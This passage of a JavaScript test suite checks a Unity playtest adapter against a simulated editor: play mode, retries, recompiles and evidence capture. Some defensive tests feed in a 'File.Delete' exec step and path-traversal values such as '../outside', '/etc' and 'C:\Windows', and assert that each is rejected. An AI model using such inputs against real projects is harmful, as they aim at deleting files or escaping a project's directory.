  assert.match(shot.content[0].text, /f1-pause-menu\.png/);
  assert.deepEqual(shot.content[1], { type: 'image', data: PNG, mimeType: 'image/png' });
  assert.ok(isPng(path.join(evidenceDir, 'f1-pause-menu.png')));

  const state = await bridge.callTool('game_state', {});
  assert.deepEqual(JSON.parse(state.content[0].text), { scene: 'Level1', score: 3 });

  const steps = [{ type: 'key', key: 'Space', holdMs: 100 }, { type: 'ui', name: 'PlayButton' }];
  const input = await bridge.callTool('send_input', { steps });
  assert.deepEqual(JSON.parse(input.content[0].text), { done: 2 });
  assert.deepEqual(unity.calls.at(-1), ['execute_custom_tool', { tool_name: 'playtest_driver', parameters: { steps, action: 'input' } }]);

  const errors = await bridge.callTool('console_errors', {});
  assert.match(errors.content[0].text, /NullReferenceException/);
  assert.deepEqual(unity.calls.at(-1)[0], 'read_console');

  await bridge.callTool('wait', { ms: 750 });
  assert.deepEqual(slept, [750]);
  assert.deepEqual([unity.sessions, unity.closed], [4, 4]);

  const bad = await bridge.callTool('send_input', { steps: [{ type: 'exec', code: 'File.Delete' }] });
  assert.equal(bad.isError, true);
  assert.equal(unity.calls.length, 4, 'a rejected step never reaches Unity');
});

test('unity start without a PlaytestDriver fails, names the card and leaves play mode', async () => {
  const world = unityWorld({ driver: false });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(unityProfile), (err) => {
    assert.match(err.message, /no working PlaytestDriver/);
    assert.ok(err.message.includes(U.PLAYTEST_DRIVER_CARD.text));
    return true;
  });
  assert.equal(callNames(world.unity.calls).at(-1), 'manage_editor:stop');
  assert.deepEqual(adapter.tools().allowedTools, []);
  assert.equal(fs.existsSync(path.join(adapter.evidenceDir, U.FINAL_SHOT)), false, 'no evidence from a game that never ran');
});

test('unity start gives up when play mode never starts', async () => {
  const world = unityWorld({ playingAfter: Infinity });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(unityProfile), /did not enter play mode within 5s/);
  assert.ok(world.t >= 5000);
  assert.equal(callNames(world.unity.calls).at(-1), 'manage_editor:stop');
});

test('unity profile: the MCP url must be loopback and the scene a project path', async () => {
  for (const bad of [
    { ...unityProfile, unityMcpUrl: 'http://192.168.1.5:8080/mcp' },
    { ...unityProfile, unityMcpUrl: 'file:///C:/x' },
    { ...unityProfile, scene: '../outside.unity' },
    { ...unityProfile, scene: 'Assets/../../x.unity' },
    { ...unityProfile, adapter: 'electron' },
  ]) {
    const world = unityWorld();
    const adapter = A.createAdapter('unity', world.opts);
    await assert.rejects(adapter.start(bad), /invalid project profile/, JSON.stringify(bad));
    assert.equal(world.unity.sessions, 0);
  }
});

// ============================================================================
// unity adapter over the official Unity MCP (Unity Pipeline)
// ============================================================================

const P = require('../helpers/playtest-bridge/pipeline-http.js');

const pipelineProfile = { adapter: 'unity', scene: 'Assets/Scenes/Level1.unity', readyTimeoutSec: 5 };
// A fake bearer token, built at runtime (never a secret-shaped literal).
const PIPE_TOKEN = Buffer.from(`lunacore-adapter-${'z'.repeat(20)}`).toString('base64');
// A console capture session id as the editor makes them (a GUID in "N" format).
const CONSOLE_SESSION = '0f'.repeat(16);
const isObj = (v) => !!v && typeof v === 'object' && !Array.isArray(v);
// What start() asks the editor before play mode when there is nothing to compile (lunasworkUnityEditor.js).
const PREP_LOG = Object.freeze([
  'editor set_auto_tick',
  'editor status',
  'editor invoke_menu',
  'script recompile',
  'script recompile_status',
  'editor status',
  'console get',
]);
// What stop() asks after the Playtester: the console window, state, final shot, play mode off, auto tick back.
const STOP_LOG = Object.freeze(['console get', 'playtest state', 'playtest screenshot', 'editor.playmode stop', 'editor set_auto_tick']);

/**
 * The open editor behind the Unity Pipeline at the HTTP level: the REAL
 * pipeline client runs on an injected fetch / readFile. Entering play mode
 * reloads the domain: the port file is gone for `reloadReads` reads, then the
 * editor answers 503 settling `busyReplies` times. `log` is what the editor saw.
 * Failure knobs: busyBeforePlay (play refused busy n times, not run),
 * lostPlayAnswer (play runs, its answer is lost), playFails, driverAuthFails,
 * statusFails (editor status fails in play mode).
 * Before play mode (the recompile): compile 'up_to_date' (nothing to compile),
 * {polls: n} (compiling for n status polls, then a domain reload), 'fails'
 * (compile errors compileErrors), 'standing' (errors already standing: the
 * recompile itself is refused), 'forever' (never done) or 'reloadForever'
 * (compiled, then the editor never comes back from its domain reload).
 * reloadDelayPolls: 'completed' shows for n more status polls before the
 * scripts reload (codeLoadCount unchanged meanwhile, editor idle).
 * recompileLost: 'ran' (it runs, the answer is lost) or 'notRun' (lost before
 * it ran, once). noGroundTruth: the console answers without groundTruth.
 * vanishAfterPolls: the editor disappears after n recompile_status answers.
 * lostAutoTick: n set_auto_tick answers lost after the setting was applied. The console holds entries with
 * seq numbers in one capture session; consoleBefore are logged before the
 * playtest, playing logs the game's own NullReferenceException.
 * listed: the playtest commands the catalog lists (default: all with driver).
 */
function fakePipelineEditor({
  reloadReads = 1, busyReplies = 1, driver = true, reloadForever = false, statusFails = false,
  busyBeforePlay = 0, lostPlayAnswer = false, playFails = false, driverAuthFails = false,
  busyBeforeStop = 0, stopFails = 0, driverListed = driver, busyList = 0,
  compile = 'up_to_date', compileErrors = [], consoleBefore = [], listed = null, consoleSession = CONSOLE_SESSION,
  reloadDelayPolls = 0, recompileLost = null, noGroundTruth = false, vanishAfterPolls = 0, lostAutoTick = 0,
} = {}) {
  const ed = {
    log: [], requests: [], reads: [], dirs: [], sessions: 0, closed: 0, playMode: 'stopped', missing: 0, busy: 0, busyBeforePlay, busyBeforeStop, stopFails,
    busyList, notFound: [], keys: [], playerX: -0.27,
    autoTick: [], codeLoadCount: 1, compilePolls: 0, recompile: { status: 'idle', failed: false, errors: [] },
    compilationFailed: compile === 'standing', consoleSession, console: [],
    reloadIn: 0, statusPolls: 0, recompileLost, lostAutoTick, codeLoadAtPlay: null,
  };
  ed.logConsole = (level, message) => ed.console.push({ seq: ed.console.length + 1, level, logType: level === 'error' ? 'Error' : 'Warning', message, stackTrace: '' });
  for (const [level, message] of consoleBefore) ed.logConsole(level, message);
  if (compile === 'standing') for (const message of compileErrors) ed.logConsole('error', message);
  const consoleAnswer = (p) => {
    const reset = p['since-session'] !== undefined && p['since-session'] !== ed.consoleSession;
    const since = reset || p.since === undefined ? -1 : p.since;
    const levels = p.level === 'error' ? ['error'] : ['error', 'warn'];
    const entries = ed.console.filter((e) => e.seq > since && levels.includes(e.level)).slice(-p.tail);
    const count = (level) => ed.console.filter((e) => e.level === level).length;
    const groundTruth = { compilationFailed: ed.compilationFailed, compiling: ed.recompile.status === 'compiling', consoleErrors: count('error'), ageMs: 40 };
    return {
      entries, cursor: ed.console.length, session: ed.consoleSession, returned: entries.length, dropped: reset, reset,
      counts: { error: count('error'), warn: count('warn'), log: 0 },
      ...(noGroundTruth ? {} : { groundTruth }),
    };
  };
  const recompileStatus = () => {
    ed.statusPolls += 1;
    if (vanishAfterPolls && ed.statusPolls >= vanishAfterPolls) ed.missing = Infinity;
    if (ed.reloadIn > 0) {
      ed.reloadIn -= 1;
      if (ed.reloadIn === 0) {
        ed.codeLoadCount += 1;
        ed.missing = 1;
      }
    } else if (ed.recompile.status === 'compiling' && compile !== 'forever') {
      if (ed.compilePolls > 0) {
        ed.compilePolls -= 1;
      } else if (compile === 'fails' || (isObj(compile) && compile.fails === true)) {
        ed.recompile = { status: 'completed', failed: true, errors: compileErrors };
        ed.compilationFailed = true;
        for (const message of compileErrors) ed.logConsole('error', message);
      } else {
        // Compiled: the domain reloads (the port file is gone once, or for good) and the scripts load again.
        ed.recompile = { status: 'completed', failed: false, errors: [] };
        if (reloadDelayPolls > 0) {
          ed.reloadIn = reloadDelayPolls;
        } else {
          ed.codeLoadCount += 1;
          ed.missing = compile === 'reloadForever' ? Infinity : 1;
        }
      }
    }
    const answer = { ...ed.recompile, compilationFailed: ed.compilationFailed };
    // As RecompileCommand.RecompileStatus: a status without evidence of its own defers to the native flag.
    if (answer.compilationFailed && !answer.failed && ['idle', 'up_to_date'].includes(answer.status)) return { ...answer, status: 'completed', failed: true };
    return answer;
  };
  const listedCommands = listed || (driverListed ? UN.DRIVER_COMMANDS : []);
  const readFile = async (file) => {
    ed.reads.push(file);
    if ((reloadForever && ed.playMode === 'playing') || ed.missing > 0) {
      ed.missing = Math.max(0, ed.missing - 1);
      ed.log.push('(port file missing)');
      throw Object.assign(new Error(`ENOENT: no such file or directory, open '${file}'`), { code: 'ENOENT' });
    }
    return JSON.stringify({ pid: 99, port: 7802, evalToken: PIPE_TOKEN, lastHeartbeat: new Date().toISOString(), projectPath: 'game', endpoints: {} });
  };
  const reply = (status, json) => ({ ok: status < 300, status, text: async () => JSON.stringify(json) });
  const ok = (result) => reply(200, { success: true, result });
  const notFound = (command) => {
    ed.notFound.push(command);
    return reply(400, { success: false, error: 'Command Not Found', errorDetails: `No command '${command}'` });
  };
  const answers = {
    // The command catalog: the playtest group is listed only when the game has the driver.
    'pipeline list_commands': (p) => {
      const commands = p.group === 'playtest' ? listedCommands.map((command) => ({ command, group: 'playtest' })) : [];
      return ok({ commands, count: commands.length, total: commands.length, offset: 0, limit: null });
    },
    // Before play mode: auto tick, asset refresh, the recompile and its status (com.unity.pipeline 1.0.0 shapes).
    'editor set_auto_tick': (p) => {
      ed.autoTick.push(p);
      return ok({ enabled: p.enabled, intervalMs: p['interval-ms'], persisted: p.persist });
    },
    'editor invoke_menu': (p) => ok({ path: p.path, executed: true }),
    'script recompile': () => {
      if (compile === 'standing') return reply(400, { success: false, error: 'Command Failed', errorDetails: 'Scripts still have compile errors; nothing was recompiled.' });
      if (compile === 'up_to_date') {
        ed.recompile = { status: 'up_to_date', failed: false, errors: [] };
        return ok({ status: 'up_to_date' });
      }
      ed.recompile = { status: 'compiling', failed: false, errors: [] };
      ed.compilePolls = isObj(compile) ? compile.polls : 0;
      return ok({ status: 'compiling' });
    },
    'script recompile_status': () => ok(recompileStatus()),
    // The editor's built-in commands (answer shapes as com.unity.pipeline 1.0.0 gave them live).
    'capture game_view': () => ok({ width: 1280, height: 720, encoding: 'png', base64: PNG, bytes: 18, source: 'screen', savedPath: null }),
    'runtime status': () => ok({ IsPlaying: ed.playMode === 'playing', LoadedLevelName: 'Level1', FrameCount: 120, TimeScale: 1, RealTimeSinceStartup: 12.5 }),
    'scene list_open': () => ok([{ name: 'Level1', path: 'Assets/Scenes/Level1.unity', isLoaded: true, isDirty: false, isActive: true, rootCount: 5 }]),
    'gameobject find': (p) => ok(p.name === 'Player' ? [{ hierarchyPath: '/Player', type: 'GameObject' }] : null),
    'component get_properties': () => ok({ component: { hierarchyPath: '/Player', type: 'Transform' }, properties: { m_LocalPosition: [ed.playerX, 2, 0], m_LocalScale: [0.8, 1.6, 1] } }),
    'runtime simulate_key': (p) => {
      ed.keys.push(`${p.key}:${p.action}`);
      return ok({ Command: 'simulate_key', Detail: `${p.key} ${p.action}` });
    },
    'scene open': (p) => ok({ path: p.path }),
    'editor.playmode start': () => {
      if (playFails) return reply(400, { success: false, error: 'Play mode is disabled in this project' });
      ed.playMode = 'playing';
      ed.codeLoadAtPlay = ed.codeLoadCount;
      ed.missing = reloadReads;
      ed.busy = busyReplies;
      ed.logConsole('error', 'NullReferenceException in Enemy.Update');
      return ok({});
    },
    'editor.playmode stop': () => {
      if (ed.stopFails > 0) {
        ed.stopFails -= 1;
        return reply(400, { success: false, error: 'Play mode could not stop' });
      }
      ed.playMode = 'stopped';
      return ok({});
    },
    'editor status': (p, command) => (statusFails && ed.playMode === 'playing' ? notFound(command) : ok({
      status: ed.recompile.status === 'compiling' ? 'compiling' : 'ready',
      compiling: ed.recompile.status === 'compiling',
      domainReloadInProgress: false,
      codeLoadCount: ed.codeLoadCount,
      playMode: ed.playMode,
      playerLoopTicking: true,
      runInBackground: true,
    })),
    'console get': (p) => ok(consoleAnswer(p)),
    'playtest state': (p, command) => {
      if (driverAuthFails) return reply(401, { success: false, error: 'Unauthorized' });
      return driver ? ok({ scene: 'Level1', score: 3 }) : notFound(command);
    },
    'playtest screenshot': (p, command) => (driver ? ok({ png: PNG, width: 1920, height: 1080 }) : notFound(command)),
  };
  const fetch = async (url, init) => {
    const { command, parameters } = JSON.parse(init.body);
    ed.requests.push({ url, command, parameters, auth: init.headers.authorization });
    const playing = command === 'editor.playmode start';
    const stopping = command === 'editor.playmode stop';
    if (command === 'pipeline list_commands' && ed.busyList > 0) {
      ed.busyList -= 1;
      ed.log.push(`${command} (busy)`);
      return reply(503, { success: false, status: 'busy', busyReason: 'domain reload', retryable: true });
    }
    if (ed.busy > 0 || (playing && ed.busyBeforePlay > 0) || (stopping && ed.busyBeforeStop > 0)) {
      if (playing && ed.busyBeforePlay > 0) ed.busyBeforePlay -= 1;
      else if (stopping && ed.busyBeforeStop > 0) ed.busyBeforeStop -= 1;
      else ed.busy -= 1;
      ed.log.push(`${command} (busy)`);
      return reply(503, { success: false, status: 'busy', busyReason: 'settling', retryable: true });
    }
    const socketDropped = () => new TypeError('fetch failed', { cause: Object.assign(new Error('other side closed'), { code: 'UND_ERR_SOCKET' }) });
    if (command === 'script recompile' && ed.recompileLost === 'notRun') {
      ed.recompileLost = null;
      ed.log.push(`${command} (lost before it ran)`);
      throw socketDropped();
    }
    ed.log.push(command);
    const res = answers[command] ? answers[command](parameters, command) : notFound(command);
    if (playing && lostPlayAnswer) throw socketDropped();
    if (command === 'script recompile' && ed.recompileLost === 'ran') {
      ed.recompileLost = null;
      throw socketDropped();
    }
    if (command === 'editor set_auto_tick' && ed.lostAutoTick > 0) {
      ed.lostAutoTick -= 1;
      throw socketDropped();
    }
    return res;
  };
  ed.connect = (dir) => {
    ed.sessions += 1;
    ed.dirs.push(dir);
    const client = P.createPipelineClient({ projectDir: dir, fetch, readFile });
    return { exec: client.exec, close: async () => { ed.closed += 1; } };
  };
  return ed;
}

function pipelineWorld(editorOpts) {
  const world = fakeWorld();
  world.editor = fakePipelineEditor(editorOpts);
  world.logs = [];
  world.opts.connectPipeline = world.editor.connect;
  world.opts.connectUnity = () => {
    throw new Error('a profile without unityMcpUrl must not use MCP for Unity');
  };
  world.opts.nodeBinary = 'C:\\LunaCore\\LunaCore.exe';
  world.opts.log = (line) => world.logs.push(line);
  return world;
}

test('unity pipeline: scene open, play, a poll that survives the domain reload, then playtest state - one connection', async () => {
  const world = pipelineWorld();
  const adapter = A.createAdapter('unity', world.opts);
  const res = await adapter.start(pipelineProfile);

  assert.deepEqual(res, { handle: { kind: 'unity', scene: 'Assets/Scenes/Level1.unity' } });
  assert.deepEqual(world.editor.log, [
    ...PREP_LOG,
    'scene open',
    'editor.playmode start',
    '(port file missing)',
    'editor status (busy)',
    'editor status',
    'pipeline list_commands',
    'playtest state',
  ]);
  const params = (command) => world.editor.requests.find((r) => r.command === command).parameters;
  assert.deepEqual(params('scene open'), { path: 'Assets/Scenes/Level1.unity' });
  assert.deepEqual(params('editor set_auto_tick'), { enabled: true, 'interval-ms': 16, persist: true });
  assert.deepEqual(params('editor invoke_menu'), { path: 'Assets/Refresh' });
  assert.deepEqual(params('script recompile'), {}, 'no focus steal');
  assert.ok(world.editor.requests.every((r) => r.url === 'http://127.0.0.1:7802/api/exec' && r.auth === `Bearer ${PIPE_TOKEN}`));
  assert.equal(world.t, 1000, 'two retries, one poll interval apart');
  assert.deepEqual([world.editor.sessions, world.editor.closed], [1, 1], 'one editor = one connection, closed again');
  assert.deepEqual(world.editor.dirs, [path.resolve(world.opts.projectDir)], 'the repo dir is the Unity project');
  assert.equal(world.editor.reads[0], path.join(world.opts.projectDir, 'Library', 'Pipeline', '.unity-pipeline-port'));
  assert.equal(world.spawns.length, 0, 'nothing is launched: the editor is already open');
  await adapter.stop();
});

test('unity pipeline stop saves unity-console.json, unity-state.json and final.png, then runs editor.playmode stop once', async () => {
  const world = pipelineWorld();
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  world.editor.log.length = 0;
  world.editor.requests.length = 0;

  assert.equal(await adapter.stop(), true);
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.editor.log, STOP_LOG);
  assert.deepEqual(world.editor.requests[0].parameters, { tail: 100, level: 'warning', since: 0, 'since-session': CONSOLE_SESSION });
  const consoleDump = JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.CONSOLE_FILE), 'utf8'));
  assert.equal(consoleDump.entries[0].message, 'NullReferenceException in Enemy.Update');
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.STATE_FILE), 'utf8')), { scene: 'Level1', score: 3 });
  assert.ok(isPng(path.join(adapter.evidenceDir, U.FINAL_SHOT)));
  assert.deepEqual(adapter.tools().allowedTools, []);
  assert.equal(world.editor.playMode, 'stopped');
});

test('unity pipeline stop: a busy editor (stop not run) gets editor.playmode stop again', async () => {
  const world = pipelineWorld({ busyBeforeStop: 2 });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  world.editor.log.length = 0;

  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.editor.log.slice(-4), ['editor.playmode stop (busy)', 'editor.playmode stop (busy)', 'editor.playmode stop', 'editor set_auto_tick']);
  assert.equal(world.editor.playMode, 'stopped');
});

test('unity pipeline stop: a failed stop is not cached - a later stop() tries again', async () => {
  const world = pipelineWorld({ stopFails: 1 });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  world.editor.log.length = 0;

  assert.equal(await adapter.stop(), false);
  assert.ok(world.logs.some((l) => /could not leave Unity play mode: .*Play mode could not stop/.test(l)), world.logs.join('\n'));
  assert.equal(world.editor.playMode, 'playing');
  assert.equal(await adapter.stop(), true);
  assert.equal(world.editor.playMode, 'stopped');
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.editor.log.filter((l) => l.startsWith('editor.playmode stop')), ['editor.playmode stop', 'editor.playmode stop'], 'success is cached');
});

test('unity pipeline tools() hands the bridge --unity-project (repo dir + unityProjectSubdir), after start', async () => {
  const world = pipelineWorld();
  const adapter = A.createAdapter('unity', world.opts);
  assert.deepEqual(adapter.tools().allowedTools, [], 'nothing before play mode');
  await adapter.start({ ...pipelineProfile, unityProjectSubdir: 'Game\\Unity' });

  const unityDir = path.join(world.opts.projectDir, 'Game', 'Unity');
  assert.deepEqual(world.editor.dirs, [unityDir]);
  assert.equal(world.editor.reads[0], path.join(unityDir, 'Library', 'Pipeline', '.unity-pipeline-port'));
  const { mcpConfig, allowedTools } = adapter.tools();
  assert.deepEqual(mcpConfig.mcpServers[SERVER_NAMES.unity].args, [
    BRIDGE_PATH,
    '--backend', 'unity',
    '--evidence-dir', adapter.evidenceDir,
    '--unity-project', unityDir,
    '--unity-console-session', CONSOLE_SESSION, '--unity-console-cursor', '0',
  ]);
  assert.deepEqual(allowedTools, toolNames('unity').map((t) => `mcp__${SERVER_NAMES.unity}__${t}`));
  await adapter.stop();
});

test('unity pipeline without a PlaytestDriver: detected from the catalog, no missing command is ever called', async () => {
  const world = pipelineWorld({ driver: false });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);

  assert.deepEqual(world.editor.log, [
    ...PREP_LOG,
    'scene open',
    'editor.playmode start',
    '(port file missing)',
    'editor status (busy)',
    'editor status',
    'pipeline list_commands',
  ]);
  assert.deepEqual(world.editor.requests.at(-1).parameters, { group: 'playtest', detail: 'compact' });
  assert.deepEqual(world.editor.notFound, [], 'detection triggers no Command Not Found (no console error)');
  assert.ok(world.logs.some((l) => /no PlaytestDriver \(playtest state, playtest input, playtest screenshot not listed\)/.test(l)), world.logs.join('\n'));

  // The Playtester's bridge is told to use the built-ins.
  const { mcpConfig } = adapter.tools();
  assert.deepEqual(mcpConfig.mcpServers[SERVER_NAMES.unity].args.slice(-8, -4), ['--unity-project', path.resolve(world.opts.projectDir), '--unity-driver', 'builtin']);
  assert.equal(await adapter.combatFeelLog(), null, 'no driver, no combat log');

  world.editor.log.length = 0;
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.editor.log, [
    'console get',
    'runtime status', 'scene list_open', 'gameobject find', 'gameobject find', 'component get_properties',
    'capture game_view',
    'editor.playmode stop',
    'editor set_auto_tick',
  ]);
  assert.deepEqual(world.editor.notFound, []);
  const state = JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.STATE_FILE), 'utf8'));
  assert.equal(state.source, 'unity-builtin');
  assert.equal(state.scene, 'Level1');
  assert.deepEqual(state.players, [{ path: '/Player', localPosition: [-0.27, 2, 0], localScale: [0.8, 1.6, 1] }]);
  assert.ok(isPng(path.join(adapter.evidenceDir, U.FINAL_SHOT)), 'the Game view capture is the final screenshot');
});

test('unity pipeline: busy / domain-reload answers to the catalog after play mode start are retried', async () => {
  const world = pipelineWorld({ driver: false, busyList: 2 });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);

  assert.deepEqual(world.editor.log.slice(-3), ['pipeline list_commands (busy)', 'pipeline list_commands (busy)', 'pipeline list_commands']);
  assert.equal(world.t, 2000, 'two more polls after the play-mode wait');
  assert.ok(adapter.tools().mcpConfig.mcpServers[SERVER_NAMES.unity].args.includes('builtin'));
  await adapter.stop();
});

test('unity pipeline with a PlaytestDriver: the bridge keeps the driver path (no --unity-driver flag)', async () => {
  const world = pipelineWorld();
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);
  assert.ok(!adapter.tools().mcpConfig.mcpServers[SERVER_NAMES.unity].args.includes('--unity-driver'));
  assert.deepEqual(world.editor.notFound, []);
  await adapter.stop();
});

test('unity pipeline: driver commands listed but broken - start fails, names the card and leaves play mode', async () => {
  const world = pipelineWorld({ driver: false, driverListed: true });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), (err) => {
    assert.ok(err.message.startsWith(`${U.NO_DRIVER_ERROR} (Unity command 'playtest state' failed: Command Not Found`), err.message);
    assert.ok(err.message.includes(U.PLAYTEST_DRIVER_CARD.text));
    return true;
  });
  assert.deepEqual(world.editor.log.slice(-4), ['pipeline list_commands', 'playtest state', 'editor.playmode stop', 'editor set_auto_tick'], 'a failed command is not retried');
  assert.deepEqual(adapter.tools().allowedTools, []);
  assert.equal(fs.existsSync(path.join(adapter.evidenceDir, U.FINAL_SHOT)), false, 'no evidence from a game that never ran');
});

test('unity pipeline: a reload that never ends times out with the last error', async () => {
  const world = pipelineWorld({ reloadForever: true });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), /did not enter play mode within 5s \(last error: Unity editor not open on .*, or com\.unity\.pipeline not installed\)/);
  assert.ok(world.t >= 5000);
  assert.ok(world.logs.some((l) => /could not leave Unity play mode/.test(l)), 'the failed stop is logged, not swallowed');
});

test('unity pipeline: a failure that is not a reload ends the wait at once', async () => {
  const world = pipelineWorld({ reloadReads: 0, busyReplies: 0, statusFails: true });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), /Unity command 'editor status' failed: Command Not Found/);
  assert.equal(world.t, 0, 'no retry');
  assert.deepEqual(world.editor.log.slice(-2), ['editor.playmode stop', 'editor set_auto_tick']);
});

test('unity pipeline: a busy editor is waited out before play; a play whose answer is lost still reaches play mode', async () => {
  const world = pipelineWorld({ busyBeforePlay: 1, lostPlayAnswer: true });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);

  assert.deepEqual(world.editor.log, [
    ...PREP_LOG,
    'scene open',
    'editor.playmode start (busy)', // not run: sent again
    'editor.playmode start', // run, but the answer is lost: never sent twice
    '(port file missing)',
    'editor status (busy)',
    'editor status',
    'pipeline list_commands',
    'playtest state',
  ]);
  assert.equal(world.t, 1500);
  assert.ok(world.logs.some((l) => /Unity play mode: no answer \(.*fetch failed: UND_ERR_SOCKET\)/.test(l)), world.logs.join('\n'));
  assert.ok(adapter.tools().allowedTools.length > 0);
  await adapter.stop();
});

test('unity pipeline: a play that fails outright still leaves play mode on the way out', async () => {
  const world = pipelineWorld({ playFails: true });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), /Unity command 'editor\.playmode start' failed: Play mode is disabled/);
  assert.deepEqual(world.editor.log, [...PREP_LOG, 'scene open', 'editor.playmode start', 'editor.playmode stop', 'editor set_auto_tick']);
});

test('unity pipeline: an editor that refuses LunaCore is not reported as a missing PlaytestDriver', async () => {
  const world = pipelineWorld({ driverAuthFails: true });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), (err) => {
    assert.match(err.message, /^Unity command 'playtest state' failed: Unauthorized$/);
    assert.equal(err.message.includes(U.NO_DRIVER_ERROR), false);
    return true;
  });
  assert.deepEqual(world.editor.log.slice(-2), ['editor.playmode stop', 'editor set_auto_tick']);
});

test('unity pipeline: unityProjectSubdir must stay inside the project; the transport follows unityMcpUrl', async () => {
  for (const unityProjectSubdir of ['../outside', 'Game/../../x', 'C:\\Windows', '/etc', '\\\\server\\share', 7, 'a\u0000b', 'x'.repeat(300)]) {
    const world = pipelineWorld();
    const adapter = A.createAdapter('unity', world.opts);
    await assert.rejects(adapter.start({ ...pipelineProfile, unityProjectSubdir }), /invalid project profile: unityProjectSubdir/, String(unityProjectSubdir));
    assert.equal(world.editor.sessions, 0);
  }
  const root = path.resolve(tmpDir('lw-unity-root-'));
  for (const sub of [undefined, null, '', '   ']) assert.deepEqual(U.unityProjectDir(root, { unityProjectSubdir: sub }), { dir: root, reason: null });
  assert.equal(U.unityProjectDir(root, { unityProjectSubdir: 'Game/' }).dir, path.join(root, 'Game'));
  assert.equal(U.unityProjectDir(root, { unityProjectSubdir: '..game' }).dir, path.join(root, '..game'), 'a folder named ..game is inside');
  assert.equal(U.unityTransport({ adapter: 'unity' }), 'pipeline');
  assert.equal(U.unityTransport({ adapter: 'unity', unityMcpUrl: 'http://127.0.0.1:8080/mcp' }), 'mcp');
  assert.equal(U.unityTransport(null), 'pipeline');
});

// ============================================================================
// unity pipeline: recompile before play, environment failures, auto tick,
// the console window, a partial PlaytestDriver
// ============================================================================

const ED = require('../src/lunasworkUnityEditor.js');
const { unityBackend: bridgeUnityBackend } = require('../helpers/playtest-bridge/bridge.js');

const AUTO_TICK_ON = Object.freeze({ enabled: true, 'interval-ms': 16, persist: true });
const count = (list, item) => list.filter((x) => x === item).length;

/** The UserSettings config com.unity.pipeline keeps in the Unity project. */
function writePipelineConfig(projectDir, config) {
  const file = path.join(projectDir, ...ED.PIPELINE_CONFIG_PARTS);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, typeof config === 'string' ? config : JSON.stringify(config));
}

test('unity pipeline recompile: the wait polls until the compile and its domain reload are done, then plays the new code', async () => {
  const world = pipelineWorld({ compile: { polls: 3 } });
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(pipelineProfile);

  const log = world.editor.log;
  const firstPlay = log.indexOf('editor.playmode start');
  const prep = log.slice(0, firstPlay);
  // 3 polls still compiling, the one that sees it done hits the reload, the last one sees the new scripts.
  assert.equal(count(prep, 'script recompile_status'), 5, prep.join('\n'));
  assert.ok(prep.includes('(port file missing)'), 'the domain reload of the compile is waited out');
  assert.ok(prep.indexOf('script recompile') > prep.indexOf('editor invoke_menu'), 'asset refresh first, then the recompile');
  assert.deepEqual(prep.slice(-2), ['console get', 'scene open'], 'compile check, then the scene, then play');
  assert.equal(world.editor.codeLoadCount, 2);
  assert.equal(world.t, 2000 + 1000, 'four polls for the compile, two for play mode');
  assert.equal(adapter.environmentFailure(), null);
  assert.ok(adapter.tools().allowedTools.length > 0);

  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.editor.autoTick, [AUTO_TICK_ON, AUTO_TICK_ON], 'on for the session, back to the editor default (watchdog on) after');
});

test('unity pipeline recompile: compile errors are an environment failure with the compiler messages - no play mode, no score', async () => {
  const errors = [
    'Assets/Game/Player.cs(12,5): error CS1002: ; expected',
    'Assets/Game/Enemy.cs(40,9): error CS0103: The name \'hp\' does not exist in the current context',
  ];
  const world = pipelineWorld({ compile: { polls: 1, fails: true }, compileErrors: errors });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), (err) => {
    assert.equal(U.isEnvironmentFailure(err), true);
    assert.deepEqual([err.ok, err.environment, err.reason, err.code], [false, true, U.ENVIRONMENT_REASON.compileFailed, U.UNITY_ENVIRONMENT_FAILURE]);
    assert.deepEqual(err.errors, errors);
    assert.match(err.message, /^Unity could not compile the game's scripts \(2 compiler errors\): Assets\/Game\/Player\.cs\(12,5\): error CS1002/);
    assert.match(err.message, /not a playtest result/);
    return true;
  });
  // Fails at the compile, not after: the scene is never opened, play mode never entered.
  assert.equal(world.editor.log.includes('editor.playmode start'), false);
  assert.equal(world.editor.log.includes('scene open'), false);
  assert.equal(world.editor.playMode, 'stopped');
  assert.deepEqual(adapter.environmentFailure(), {
    ok: false, environment: true, reason: 'compile-failed', message: adapter.environmentFailure().message, errors,
  });
  assert.deepEqual(adapter.tools().allowedTools, [], 'no Playtester tools');
  assert.deepEqual(world.editor.autoTick, [AUTO_TICK_ON, AUTO_TICK_ON], 'auto tick put back on the failure path too');
  assert.equal(world.editor.log.at(-1), 'editor set_auto_tick');
});

test('unity pipeline recompile: errors already standing (the recompile is refused) - environment failure with the console\'s compiler errors', async () => {
  const errors = ['Assets/Game/Boss.cs(3,1): error CS0246: The type or namespace name \'Foo\' could not be found'];
  const world = pipelineWorld({ compile: 'standing', compileErrors: errors, consoleBefore: [['warn', 'Shader warning: unused variable']] });
  const adapter = A.createAdapter('unity', world.opts);

  await assert.rejects(adapter.start(pipelineProfile), (err) => {
    assert.equal(err.reason, 'compile-failed');
